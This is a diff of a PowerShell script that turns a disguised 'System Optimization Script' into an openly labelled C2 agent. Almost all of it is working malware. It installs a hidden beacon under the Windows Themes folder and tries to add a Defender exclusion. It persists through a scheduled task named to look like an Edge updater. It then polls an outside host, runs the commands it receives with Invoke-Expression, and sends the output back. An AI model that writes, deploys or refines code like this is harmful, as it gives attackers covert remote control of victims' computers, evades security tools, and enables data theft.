@@ -1,115 +1,193 @@
-# System Optimization Script - Updated for New Backend
+# PowerShell Agent for Advanced C2 Backend
+# Supports: D1 results, KV commands, proper API structure
 $ErrorActionPreference = 'SilentlyContinue'
 
-# Configuration
-$C2_URL = 'https://backend.ice-cold-169.workers.dev'
-$VICTIM_ID = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})
+# ============================================
+# CONFIGURATION - UPDATE THESE!
+# ============================================
+$BACKEND_URL = 'https://backend.ice-cold-169.workers.dev'
+$AGENT_ID = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})
+$BEACON_INTERVAL = 60  # seconds
 
-# Locations
+# Installation paths
 $InstallDir = "$env:APPDATA\Microsoft\Windows\Themes"
 $BeaconPath = "$InstallDir\ThemeService.ps1"
 $LogFile = "$env:APPDATA\Microsoft\Windows\theme.log"
 
-"[$(Get-Date)] === Installation Started ===" | Out-File $LogFile
+# ============================================
+# LOGGING FUNCTION
+# ============================================
+function Write-Log {
+    param($Message)
+    $Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+    "[$Timestamp] $Message" | Out-File $LogFile -Append
+}
 
+# ============================================
+# INSTALLATION
+# ============================================
 try {
+    Write-Log "=== Installation Started ==="
+    Write-Log "Agent ID: $AGENT_ID"
+    Write-Log "Backend URL: $BACKEND_URL"
+    
     # Create directory
     if (!(Test-Path $InstallDir)) {
         New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
-        "[$(Get-Date)] Created directory: $InstallDir" | Out-File $LogFile -Append
+        Write-Log "Created directory: $InstallDir"
     }
     
-    # Try Defender exclusion
+    # Try adding Defender exclusions
     try {
         Add-MpPreference -ExclusionPath $InstallDir -Force
-        "[$(Get-Date)] Added Defender exclusion" | Out-File $LogFile -Append
+        Write-Log "Added Defender exclusion"
     } catch {
-        "[$(Get-Date)] Defender exclusion failed (OK)" | Out-File $LogFile -Append
+        Write-Log "Defender exclusion failed (continuing)"
     }
     
-    # Create beacon script (UPDATED FOR NEW BACKEND!)
+    # ============================================
+    # CREATE BEACON SCRIPT
+    # ============================================
     $BeaconScript = @"
-`$C2_URL = '$C2_URL'
-`$VICTIM_ID = '$VICTIM_ID'
+# Advanced C2 Agent - Beacon Script
+`$ErrorActionPreference = 'SilentlyContinue'
+
+# Configuration
+`$BACKEND_URL = '$BACKEND_URL'
+`$AGENT_ID = '$AGENT_ID'
+`$BEACON_INTERVAL = $BEACON_INTERVAL
 `$LogFile = '$LogFile'
 
+# Logging function
+function Write-AgentLog {
+    param(`$Message)
+    `$Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+    "[`$Timestamp] `$Message" | Out-File `$LogFile -Append
+}
+
+# Main beacon loop
 while (`$true) {
     try {
-        "[`$(Get-Date)] Beaconing..." | Out-File `$LogFile -Append
+        Write-AgentLog "Sending beacon to backend..."
         
-        # NEW BACKEND FORMAT: JSON POST
+        # Prepare beacon request
         `$beaconBody = @{
-            id = `$VICTIM_ID
+            id = `$AGENT_ID
         } | ConvertTo-Json
         
-        `$headers = @{
-            'Content-Type' = 'application/json'
-            'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
-        }
+        # Send beacon
+        `$response = Invoke-RestMethod ``
+            -Uri "`$BACKEND_URL/beacon" ``
+            -Method Post ``
+            -ContentType 'application/json' ``
+            -Body `$beaconBody ``
+            -TimeoutSec 30
         
-        # Send beacon (POST with JSON)
-        `$response = Invoke-RestMethod -Uri "`$C2_URL/beacon" -Method Post -Body `$beaconBody -Headers `$headers -TimeoutSec 30
+        Write-AgentLog "Beacon response: `$(if(`$response.command){'Command received'}else{'No command'})"
         
-        "[`$(Get-Date)] Beacon response: `$(`$response | ConvertTo-Json -Compress)" | Out-File `$LogFile -Append
-        
-        # Check if command exists
-        if (`$response.command) {
-            "[`$(Get-Date)] Executing command: `$(`$response.command)" | Out-File `$LogFile -Append
+        # Check if command received
+        if (`$response.command -and `$response.commandId) {
+            `$command = `$response.command
+            `$commandId = `$response.commandId
             
-            # Execute command
-            `$output = try {
-                Invoke-Expression `$response.command 2>&1 | Out-String
+            Write-AgentLog "Executing command ID: `$commandId"
+            Write-AgentLog "Command: `$command"
+            
+            # Execute command and capture output
+            try {
+                `$output = Invoke-Expression `$command 2>&1 | Out-String
+                Write-AgentLog "Command executed successfully"
             } catch {
-                "Error: `$(`$_.Exception.Message)"
+                `$output = "ERROR: `$(`$_.Exception.Message)"
+                Write-AgentLog "Command execution failed: `$output"
             }
             
-            "[`$(Get-Date)] Command output length: `$(`$output.Length) chars" | Out-File `$LogFile -Append
-            
-            # Send result back (JSON POST)
+            # Send result back to backend
             `$resultBody = @{
-                id = `$VICTIM_ID
-                commandId = `$response.commandId
+                agentId = `$AGENT_ID
+                commandId = `$commandId
                 output = `$output
             } | ConvertTo-Json
             
-            Invoke-RestMethod -Uri "`$C2_URL/api/result" -Method Post -Body `$resultBody -Headers `$headers -TimeoutSec 30 | Out-Null
+            `$resultResponse = Invoke-RestMethod ``
+                -Uri "`$BACKEND_URL/api/result" ``
+                -Method Post ``
+                -ContentType 'application/json' ``
+                -Body `$resultBody ``
+                -TimeoutSec 30
             
-            "[`$(Get-Date)] Result sent successfully" | Out-File `$LogFile -Append
-        } else {
-            "[`$(Get-Date)] No command, sleeping..." | Out-File `$LogFile -Append
+            Write-AgentLog "Result submitted successfully"
+        }
+        
+        # Use interval from backend response (adaptive beaconing)
+        if (`$response.interval) {
+            `$BEACON_INTERVAL = `$response.interval
         }
         
     } catch {
-        "[`$(Get-Date)] Error: `$(`$_.Exception.Message)" | Out-File `$LogFile -Append
+        Write-AgentLog "Beacon error: `$(`$_.Exception.Message)"
     }
     
-    Start-Sleep 60
+    # Sleep until next beacon
+    Start-Sleep `$BEACON_INTERVAL
 }
 "@
 
     # Write beacon script
     Set-Content -Path $BeaconPath -Value $BeaconScript -Force
-    "[$(Get-Date)] Beacon script created: $BeaconPath" | Out-File $LogFile -Append
+    Write-Log "Beacon script created: $BeaconPath"
     
-    # Create scheduled task
+    # ============================================
+    # CREATE PERSISTENCE
+    # ============================================
     $TaskName = "MicrosoftEdgeUpdateTaskMachineUA"
+    
+    # Remove existing task
     schtasks /delete /tn $TaskName /f 2>$null
     
+    # Create scheduled task
     $Action = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
     schtasks /create /tn $TaskName /tr "powershell.exe $Action" /sc ONLOGON /ru "$env:USERNAME" /rl HIGHEST /f | Out-Null
     
-    "[$(Get-Date)] Scheduled task created: $TaskName" | Out-File $LogFile -Append
+    Write-Log "Scheduled task created: $TaskName"
     
-    # Start beacon NOW
+    # ============================================
+    # START BEACON IMMEDIATELY
+    # ============================================
     Start-Process powershell.exe -ArgumentList $Action -WindowStyle Hidden
-    "[$(Get-Date)] Beacon started!" | Out-File $LogFile -Append
+    Write-Log "Beacon started!"
     
-    "[$(Get-Date)] === Installation Complete ===" | Out-File $LogFile -Append
-    "[$(Get-Date)] Victim ID: $VICTIM_ID" | Out-File $LogFile -Append
-    Write-Host "SUCCESS! Victim ID: $VICTIM_ID"
-    Write-Host "Check log: $LogFile"
+    # ============================================
+    # INITIAL BEACON TEST
+    # ============================================
+    try {
+        Write-Log "Sending initial beacon..."
+        
+        $initialBeacon = @{
+            id = $AGENT_ID
+        } | ConvertTo-Json
+        
+        $testResponse = Invoke-RestMethod `
+            -Uri "$BACKEND_URL/beacon" `
+            -Method Post `
+            -ContentType 'application/json' `
+            -Body $initialBeacon `
+            -TimeoutSec 30
+        
+        Write-Log "Initial beacon successful!"
+        Write-Log "Backend response: $($testResponse | ConvertTo-Json -Compress)"
+    } catch {
+        Write-Log "Initial beacon failed: $($_.Exception.Message)"
+    }
+    
+    Write-Log "=== Installation Complete ==="
+    Write-Host "SUCCESS! Agent installed and running."
+    Write-Host "Agent ID: $AGENT_ID"
+    Write-Host "Backend: $BACKEND_URL"
+    Write-Host "Log: $LogFile"
     
 } catch {
-    "[$(Get-Date)] FATAL ERROR: $($_.Exception.Message)" | Out-File $LogFile -Append
+    Write-Log "FATAL ERROR: $($_.Exception.Message)"
     Write-Host "ERROR: $($_.Exception.Message)"
+    Write-Host "Check log: $LogFile"
 }
